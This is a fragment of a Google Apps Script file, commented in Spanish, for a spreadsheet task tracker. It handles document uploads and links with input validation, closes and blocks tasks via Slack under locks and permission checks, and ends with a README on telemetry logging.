  if (kind === 'task') _authorizeTaskWrite(ctx, info.target);
  else _authorizeProjectWrite(ctx, info.target);

  // Validar MIME en allowlist (rechaza tipos peligrosos: html, exe, scripts, etc.)
  var mime = (fileData.mimeType || '').toString().trim().toLowerCase();
  if (!_UPLOAD_ALLOWED_MIME[mime]) {
    return { success: false, error: 'Tipo de archivo no permitido' };
  }

  var folder;
  try {
    folder = _resolveTargetFolder(kind, itemId);
  } catch (e) {
    return { success: false, error: e.message };
  }

  var bytes = Utilities.base64Decode(fileData.data);
  // Cap de tamaño para evitar agotar cuota de Drive del owner del webapp.
  if (bytes.length > _UPLOAD_MAX_BYTES) {
    return { success: false, error: 'Archivo demasiado grande (máx. 45 MB)' };
  }
  var blob = Utilities.newBlob(bytes, mime, fileData.name);
  var file = folder.createFile(blob);

  var doc = { name: file.getName(), url: file.getUrl(), id: file.getId(),
              uploadedBy: ctx.user.name, uploadedAt: new Date().toISOString() };
  var docs = info.docs.concat([doc]);
  info.ws.getRange(info.row, info.col).setValue(_serializeDocs(docs));
  invalidateCache();
  return { success: true, doc: doc };
}

// Vincula un link existente de Drive (no mueve el archivo).
function attachDocumentLink(kind, itemId, link) {
  return _safeMutation(function() { return _attachDocumentLinkImpl(kind, itemId, link); });
}
function _attachDocumentLinkImpl(kind, itemId, link) {
  if (!link || !link.url) return { success: false, error: 'URL requerida' };
  var url = link.url.toString().trim();
  // Validar esquema: solo http(s). Esto bloquea javascript:, data:, file:, etc.
  // que podrían ser usados como vector XSS persistente al renderear el link.
  if (!/^https?:\/\//i.test(url)) {
    return { success: false, error: 'URL inválida: solo se aceptan https:// o http://' };
  }
  // Validar largo razonable (evita DoS por strings gigantes en la celda)
  if (url.length > 2048) {
    return { success: false, error: 'URL demasiado larga (máx. 2048 caracteres)' };
  }
  // Bloquear caracteres de control que podrían romper el render del atributo HTML
  if (/[ -]/.test(url)) {
    return { success: false, error: 'URL contiene caracteres inválidos' };
  }
  var ctx = _getAuthContext();
  var info = _readDocsFor(kind, itemId);
  if (!info) return { success: false, error: (kind === 'project' ? 'Proyecto' : 'Tarea') + ' #' + itemId + ' no encontrado' };
  if (kind === 'task') _authorizeTaskWrite(ctx, info.target);
  else _authorizeProjectWrite(ctx, info.target);

  var doc = {
    name: (link.name || '').toString().trim() || url,
    url: url,
    id: _extractDriveId(url) || '',
    external: true,
    uploadedBy: ctx.user.name,
    uploadedAt: new Date().toISOString()
  };
  var docs = info.docs.concat([doc]);
  info.ws.getRange(info.row, info.col).setValue(_serializeDocs(docs));
  invalidateCache();
  return { success: true, doc: doc };
}

// Quita la referencia del tracker (NO borra el archivo en Drive).
function removeDocument(kind, itemId, docIndex) {
  return _safeMutation(function() { return _removeDocumentImpl(kind, itemId, docIndex); });
}
function _removeDocumentImpl(kind, itemId, docIndex) {
  var ctx = _getAuthContext();
  var info = _readDocsFor(kind, itemId);
  if (!info) return { success: false, error: 'No encontrado' };
  if (kind === 'task') _authorizeTaskWrite(ctx, info.target);
  else _authorizeProjectWrite(ctx, info.target);

  var idx = parseInt(docIndex, 10);
  if (isNaN(idx) || idx < 0 || idx >= info.docs.length) return { success: false, error: 'Índice inválido' };
  info.docs.splice(idx, 1);
  info.ws.getRange(info.row, info.col).setValue(_serializeDocs(info.docs));
  invalidateCache();
  return { success: true };
}

// ════════════════════════════════════════════════════════════════
// SLACK HELPERS
// ════════════════════════════════════════════════════════════════
// ── Busca candidatos por fuzzy match. Retorna top 3 ordenados por score.
// Cada candidato: {id, nombre, row, score, ratio, confidence: 'high'|'low'|'none'}
// high: ≥3 matches y ratio ≥0.5   low: ≥1 match   none: sin coincidencia útil
// Aunque es un read-only, lo envolvemos en _safeMutation para que un sheet
// lockup u otro error transitorio se propague al frontend como
// {success:false, error} y caiga en los failureHandlers existentes.
function findTaskCandidates(text) {
  return _safeMutation(function() { return _findTaskCandidatesImpl(text); });
}
function _findTaskCandidatesImpl(text) {
  var ss = SpreadsheetApp.openById(SHEET_ID), ws = ss.getSheetByName(SHEET_ACTIVO);
  var lr = ws.getLastRow();
  if (lr < 4) return {candidates: [], confidence: 'none'};
  var lc = Math.min(ws.getLastColumn(), TASK_COLS);
  var data = ws.getRange(4, 1, lr - 3, lc).getValues();
  var st = (text || '').toLowerCase();
  var words = st.split(/\s+/).filter(function(w){return w.length > 2});
  if (words.length === 0) return {candidates: [], confidence: 'none'};

  var scored = [];
  for (var i = 0; i < data.length; i++) {
    var n = (data[i][1] || '').toLowerCase(); if (!n) continue;
    var nameWords = n.split(/\s+/).filter(function(w){return w.length > 2});
    if (nameWords.length === 0) continue;
    var sc = 0;
    words.forEach(function(x){ if (n.indexOf(x) >= 0) sc++; });
    if (sc === 0) continue;
    // ratio: matches / (palabras relevantes del nombre) — penaliza matches triviales en nombres largos
    var ratio = sc / Math.max(nameWords.length, 1);
    scored.push({id: data[i][0], nombre: data[i][1], row: i + 4, score: sc, ratio: ratio});
  }
  scored.sort(function(a, b){ return (b.score - a.score) || (b.ratio - a.ratio); });
  var top = scored.slice(0, 3);
  var confidence = 'none';
  if (top.length > 0) {
    var best = top[0];
    if (best.score >= 3 && best.ratio >= 0.5) confidence = 'high';
    else if (best.score >= 1) confidence = 'low';
  }
  return {candidates: top, confidence: confidence};
}

// Cierra una tarea por ID (desde Slack o tras confirmación). Valida permiso:
// desde Slack, Session=owner (head) así que pasa; desde el webapp, el usuario
// debe tener permiso sobre la tarea según su rol.
function closeTaskById(taskId, slackUser) {
  return _telemetry('closeTaskById', function() {
    return _closeTaskByIdImpl(taskId, slackUser);
  }, { taskId: taskId, viaSlack: !!slackUser });
}
function _closeTaskByIdImpl(taskId, slackUser) {
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, message: 'Tarea #' + taskId + ' no encontrada' };
  _authorizeTaskWrite(ctx, current);

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  // Lock para serializar la mutación. moveToHistorial se llama fuera (tiene su
  // propio lock interno; no asumimos reentrancia del lock de Apps Script).
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  var tn;
  try {
    tn = ws.getRange(current.row, 2).getValue();
    ws.getRange(current.row, 7).setValue('Listo');
    ws.getRange(current.row, 10).setValue(new Date());
  } finally {
    lock.releaseLock();
  }
  moveToHistorial(ctx.ss, ws, current.row);
  invalidateCache();
  return { success: true, id: taskId, nombre: tn, message: 'Tarea #' + taskId + ' "' + tn + '" cerrada y movida a Historial' };
}

// Bloquea una tarea por ID. Mismas validaciones que closeTaskById.
function blockTaskById(taskId, reason, slackUser) {
  return _telemetry('blockTaskById', function() {
    return _blockTaskByIdImpl(taskId, reason, slackUser);
  }, { taskId: taskId, viaSlack: !!slackUser, hasReason: !!reason });
}
function _blockTaskByIdImpl(taskId, reason, slackUser) {
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, message: 'Tarea #' + taskId + ' no encontrada' };
  _authorizeTaskWrite(ctx, current);

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  // Lock para serializar el read-modify-write de notas (evita perder concurrencia).
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  try {
    var tn = ws.getRange(current.row, 2).getValue();
    ws.getRange(current.row, 7).setValue('Bloqueado');
    var prevNotes = ws.getRange(current.row, 11).getValue() || '';
    var stamp = '⛔ ' + (reason || '') + ' (' + (slackUser || '') + ', ' + new Date().toLocaleDateString('es-CO') + ')';
    ws.getRange(current.row, 11).setValue(_sanitizeCell((prevNotes ? prevNotes + ' | ' : '') + stamp));
    return { success: true, id: taskId, nombre: tn, message: 'Tarea bloqueada: #' + taskId + ' "' + tn + '"' };
  } finally {
    lock.releaseLock();
    invalidateCache();
  }
}
function testData() {
  var d = getTrackerData();
  Logger.log('Tasks: ' + d.tasks.length);
  Logger.log('Equipos: ' + d.equipos.length);
  Logger.log('Projects: ' + d.projects.length);
  Logger.log('Team: ' + d.team.length);
}

// ════════════════════════════════════════════════════════════════
// TELEMETRY · README
// ════════════════════════════════════════════════════════════════
// - Cómo ver los logs: Apps Script editor → "Ejecuciones" (View → Executions).
//   Cada llamada a un entry-point wrappeado emite un JSON con
//   { ts, email, fn, duration, success, error, meta } vía console.info.
//   En GCP Logging filtrá por jsonPayload.fn="updateTaskFields" para ver
//   por función o jsonPayload.success=false para ver errores.
// - Cómo activar la hoja Telemetry: el dueño del spreadsheet crea
//   manualmente una hoja con el nombre exacto 'Telemetry' y columnas
//   ts | email | fn | duration_ms | status | error | meta. A partir de
//   ese momento cada call queda persistido (1 row por call). Sin la hoja,
//   los logs viven solo en Stackdriver y se rotan según política de GCP.
// - Por qué NO loguea el body de las requests: las tareas/proyectos pueden
//   contener nombres de personas, notas confidenciales (cláusulas, montos,
//   contrapartes). Solo loggeamos metadata booleana o counts (ej. hasResp,
//   fieldCount) para correlacionar sin filtrar PII.
// - Entry-points wrappeados (5): getEditorialData, addTask, updateTaskFields,
//   closeTaskById, blockTaskById. El resto (updateTaskField, addProject,
//   uploadDocument, etc.) no está wrappeado para minimizar diff; agregar
//   más siguiendo el mismo patrón si hace falta más visibilidad.
